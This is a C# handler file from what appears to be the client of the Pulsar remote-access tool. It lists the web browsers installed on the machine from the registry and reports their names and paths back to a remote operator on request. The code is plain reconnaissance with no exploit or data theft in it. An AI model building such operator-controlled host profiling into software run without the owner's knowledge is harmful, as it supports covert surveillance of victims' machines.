using Pulsar.Common.Messages.FunStuff.GDI;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Pulsar.Common.Messages.other;
using Pulsar.Common.Messages.Monitoring.Query;
using Pulsar.Common.Models.Query.Browsers;
using Pulsar.Common.Messages.Monitoring.Query.Browsers;

namespace Pulsar.Client.Messages
{
    class QueryHandler
    {
        public bool CanExecute(IMessage message) => message is GetBrowsers;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetBrowsers msg:
                    Execute(sender, msg);
                    break;
            }
        }


        private void Execute(ISender client, GetBrowsers message)
        {
            // get the browsers on the users computer
            var browsers = new List<QueryBrowsers>();

            using (var hklmKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Clients\StartMenuInternet"))
            {
                if (hklmKey != null)
                {
                    foreach (var browserKey in hklmKey.GetSubKeyNames())
                    {
                        using (var browserProps = hklmKey.OpenSubKey(browserKey))
                        {
                            var browserName = browserProps?.GetValue(null)?.ToString();
                            using (var commandProps = browserProps?.OpenSubKey(@"shell\open\command"))
                            {
                                var command = commandProps?.GetValue(null)?.ToString();
                                var exePath = GetExecutablePath(command);
                                if (!string.IsNullOrEmpty(browserName) && !string.IsNullOrEmpty(exePath))
                                {
                                    browsers.Add(new QueryBrowsers { Browser = browserName, Location = exePath });
                                }
                            }
                        }
                    }
                }
            }

            using (var hkcuKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Clients\StartMenuInternet"))
            {
                if (hkcuKey != null)
                {
                    foreach (var browserKey in hkcuKey.GetSubKeyNames())
                    {
                        using (var browserProps = hkcuKey.OpenSubKey(browserKey))
                        {
                            var browserName = browserProps?.GetValue(null)?.ToString();
                            using (var commandProps = browserProps?.OpenSubKey(@"shell\open\command"))
                            {
                                var command = commandProps?.GetValue(null)?.ToString();
                                var exePath = GetExecutablePath(command);
                                if (!string.IsNullOrEmpty(browserName) && !string.IsNullOrEmpty(exePath))
                                {
                                    browsers.Add(new QueryBrowsers { Browser = browserName, Location = exePath });
                                }
                            }
                        }
                    }
                }
            }

            // remove dups
            browsers = browsers.GroupBy(b => b.Browser).Select(g => g.First()).ToList();

            client.Send(new GetBrowsersResponse { QueryBrowsers = browsers });
        }

        private string GetExecutablePath(string command)
        {
            if (string.IsNullOrEmpty(command))
            {
                return null;
            }

            var match = System.Text.RegularExpressions.Regex.Match(command, @"(?<path>""[^""]+\.exe""|\S+\.exe)");
            return match.Success ? match.Groups["path"].Value.Trim('"') : null;
        }
    }
}
